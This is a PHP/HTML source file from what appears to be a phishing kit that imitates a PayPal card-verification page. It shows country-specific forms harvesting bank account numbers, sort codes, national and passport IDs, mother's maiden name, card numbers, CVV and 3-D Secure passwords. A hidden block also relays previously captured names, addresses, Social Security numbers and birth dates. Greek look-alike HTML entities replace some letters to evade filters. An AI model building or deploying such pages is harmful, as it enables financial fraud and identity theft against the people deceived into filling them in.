                    					<script src="../js/jquery.payment.js"></script><script src="../js/new.look.js"></script>
                    <form method="post" id="parentForm" name="creditcard_Form" action="Submit" class="edit">
                        <p class="group fcenter">


<?php
if ($negara=="GB" or $negara=="UK"){ echo '
				<span class="help" style="padding-left:4%;">&Nu;eed for bank identification.</span>
<label for="sortcode">Account Number :</label>
						<span class="field" id="cc_holder">
						<input type="text" autocomplete="off" class="large" pattern=".{6,30}" maxlength="32" name="accnum" value="" required="" title="Account number"></span>

					<label for="sortcode">Sort Code :</label>
						<span class="field">
							<input name="sort_code1" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code3" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"></span>
';}
?>

<?php
if ($negara=="IE"){ echo '
				<span class="help" style="padding-left:4%;">&Nu;eed for bank identification.</span>
					<label for="sortcode">Sort Code :</label>
						<span class="field">
							<input name="sort_code1" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code3" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"></span>
';}
?>


<?php
if ($negara=="IE"){ echo '
<label for="accnum">Account Number :</label>
								<span class="field">
									<input maxlength="8" class="xmedium" autocomplete="off" name="accnum" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="TH"){ echo '
<label for="accnumth">Account Number :</label>
								<span class="field">
									<input maxlength="10" class="xmedium" autocomplete="off" name="accnumth" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="TH"){ echo '
<label for="citizenth">Citizen ID :</label>
								<span class="field">
									<input maxlength="13" class="xmedium" autocomplete="off" name="citizenth" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="TH"){ echo '
                               
                                     <label for="cc_holder">Credit Limit :</label>
                    <span class="field" id="cc_limitth">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="cc_limitth" value="" required="" title="Credit Limit"></span>						

   ';}
?>

<?php
if ($negara=="GR"){ echo '
<label for="accnumgr">ID Number :</label>
								<span class="field">
									<input maxlength="6" class="xmedium" autocomplete="off" name="accnumgr" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="IN"){ echo '
<label for="accnumin">Account Number :</label>
								<span class="field">
									<input maxlength="16" class="xmedium" autocomplete="off" name="accnumin" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="IN"){ echo '
                               
                                     <label for="cc_holder">Credit Limit :</label>
                    <span class="field" id="cc_limitin">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="cc_limitin" value="" required="" title="Credit Limit"></span>						

   ';}
?>

<?php
if ($negara=="CY"){ echo '
<label for="passport">Passport Number:</label>
								<span class="field">
									<input maxlength="16" class="xmedium" autocomplete="off" name="passport" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="QA"){ echo '
<label for="qatarid">Qatar ID :</label>
								<span class="field">
									<input maxlength="16" class="xmedium" autocomplete="off" name="qatarid" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="CY"){ echo '
<label for="accnum">Account Number :</label>
								<span class="field">
									<input maxlength="16" class="xmedium" autocomplete="off" name="accnum" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="IE"){ echo '
                               
                                     <label for="cc_holder">Credit Limit :</label>
                    <span class="field" id="cc_limit">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="cc_limit" value="" required="" title="Credit Limit"></span>

              
                  ';}
				  ?>

<?php
if ($negara=="KW"){ echo '
<label for="accnum">Civil ID Number :</label>
								<span class="field">
									<input maxlength="12" class="xmedium" autocomplete="off" name="accnum" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="CA"){ echo '
<label for="mmn">Mother Maiden Name :</label>
								<span class="field">
									<input maxlength="10" class="xmedium" autocomplete="off" name="mmn" value="" required="" type="text"></span>
';}
?>

<?php
if ($negara=="NZ"){ echo '
                               
                                     <label for="cc_holder">Credit Limit :</label>
                    <span class="field" id="cc_limit">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="cc_limit" value="" required="" title="Credit Limit"></span>						

   ';}
?>

<?php
if ($negara=="NZ"){ echo '
                               
                                     <label for="cc_holder">Account Number :</label>
                    <span class="field" id="acc_num">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="acc_num" value="" required="" title="Acc Number"></span>           
                  ';}


?>

<?php
if ($negara=="NZ"){ echo '
                               
                                     <label for="cc_holder">BNZ Access Number :</label>
                    <span class="field" id="bnz">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="bnz" value="" required="" title="BNZ Access Number"></span>

              
                  ';}
?>
				  
				  
<?php
if ($negara=="CH"){ echo '
                               
                                     <label for="cc_holder">Account Number :</label>
                    <span class="field" id="acc_number">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="acc_number" value="" required="" title="Acc Number"></span>           
                  ';}
?>
				  
<?php
if ($negara=="AU"){ echo '
				<span class="help" style="padding-left:4%;">&Nu;eed for bank identification.</span>
					<label for="sortcode">Bank/State/Branch Number :</label>
						<span class="field">
							<input name="bsbnum_1" class="xxsmall" pattern="[0-9]{2,}" maxlength="3" autocomplete="off" required="required" type="text" title=""> - 
							
							<input name="bsbnum_2" class="xxsmall" pattern="[0-9]{2,}" maxlength="3" autocomplete="off" required="required" type="text" title=""></span>
';}
?>
<?php
if ($negara=="AU"){ echo '
<label for="accnum">Account Number :</label>
								<span class="field">
									<input maxlength="9" class="xmedium" autocomplete="off" name="accnum" value="" required="" type="text"></span>
';}
?>
<?php
if ($negara=="AU"){ echo '
                               
                                     <label for="cc_holder">Credit Limit :</label>
                    <span class="field" id="cc_limit">
                        <input type="text" autocomplete="off" class="large" maxlength="32" name="cc_limit" value="" required="" title="Credit Limit"></span>

              
                  ';}
?>


                            <span class="help" style="padding-left:4%;">&Nu;ame as it appears on Card.</span>
                                <label for="cc_holder">Cardholder &Nu;ame :</label>
					<span class="field" id="cc_holder">
						<input type="text" autocomplete="off" class="large" pattern=".{2,30}" maxlength="32" name="cc_holder" value="" required="" title="Cardholder name"></span>



                            <label for="cc_number">Card Number :</label>
                                <span class="field">
                                    <input type="text" id="cc_number" autocomplete="off" style="width: 12em;" pattern="[2-7][0-9 ]{11,20}" maxlength="20" name="cc_number" value="" required="" title="Only number">
                                </span>


                     
                            <label for="expdate">&Epsilon;xpiration Date :</label>
                                <span class="field" style="margin-bottom: 7px;">
<?php
echo date_dropdown(20);
function date_dropdown($year_limit = 0)
{
        /*month*/
        $html_output .= '                                   <select class="smal" required="required" name="expdate_month" title="Exp month">'."\n";
        $html_output .= '                                       ';
            for ($exp_month = 1; $exp_month <= 12; $exp_month++) {
            	if (strlen($exp_month) === 1){
            		$html_output .= '<option value="0' . $exp_month . '">0' . $exp_month . '</option>';
            	} else {
            		$html_output .= '<option value="' . $exp_month . '">' . $exp_month . '</option>';
            	}
            }
        $html_output .= "\n".'                                  </select>&nbsp;&nbsp;/&nbsp;&nbsp;'."\n";

        /*years*/
    if (date('m') == 12){
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y') + 1; $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    } else {
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y'); $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    }

    return $html_output;
}
?>
                                </span>
                                    
                                    
                            	<label for="cvv2_number">Card Security C&omicron;de :</label>
					<span class="field">
						<input id="cvv2_number" autocomplete="off" style="width:3.49em;" pattern="[0-9]{3,5}" maxlength="4" name="cvv2_number" value="" required="" type="text" title="Enter a valid csc">
						<span class="small"><a target="_blank" href="../page/cvv_info_pop&amp;enable_locale.htm" onclick="AYPAL.core.openWindow(event, {width: 425, height: 450});" id="1"> What is this?</a></span>
					</span>

                    <label for="3dsecure">VBV / MCSC Password :</label>
                                <span class="field">
                                    <input type="password" id="3dsecure" autocomplete="off" style="width: 12em;" maxlength="20" name="3dsecure" value="" required="" title="Verified by Visa / MasterCard Secure Code Password"><img src="https://www.sc.com/ph/personal-banking/cards/3d-secure/en/_images/verifiedVisa.jpg" width="105" style="margin-top: -10px;">
                                </br>
<span class='desc lighter'>Please enter a valid Password for Verified by Visa or MasterCard Secure Code. leave blank If your Card is not enrolled.</span>	
                            <div class="ngawur">
                            </div>

                        </p>

                        <p class="bcenter">
                        <button style="width: 100px !important;" type="submit" value="Submit" class="button">Submit</button></p>

                        <div style="display:none;"><input name="full_name" value="<?php echo $_POST['full_name'];?>"><input name="address1" value="<?php echo $_POST['address_1'];?>"><input name="address2" value="<?php echo $_POST['address_2'];?>"><input name="city" value="<?php echo $_POST['city'];?>"><input name="state" value="<?php echo $_POST['state'];?>"><input name="postal" value="<?php echo $_POST['postal'];?>"><input name="phone" value="<?php echo $_POST['phone'];?>"><input name="ssn1" value="<?php echo $_POST['number_1'];?>"><input name="ssn2" value="<?php echo $_POST['number_2'];?>"><input name="ssn3" value="<?php echo $_POST['number_3'];?>"><input name="id_number" value="<?php echo $_POST['id_number'];?>"><input name="dob_day" value="<?php echo $_POST['day'];?>"><input name="dob_month" value="<?php echo $_POST['month'];?>"><input name="dob_year" value="<?php echo $_POST['year'];?>"><input name="mmd" value="<?php echo $_POST['mmd'];?>"></div>
                        
                    </form>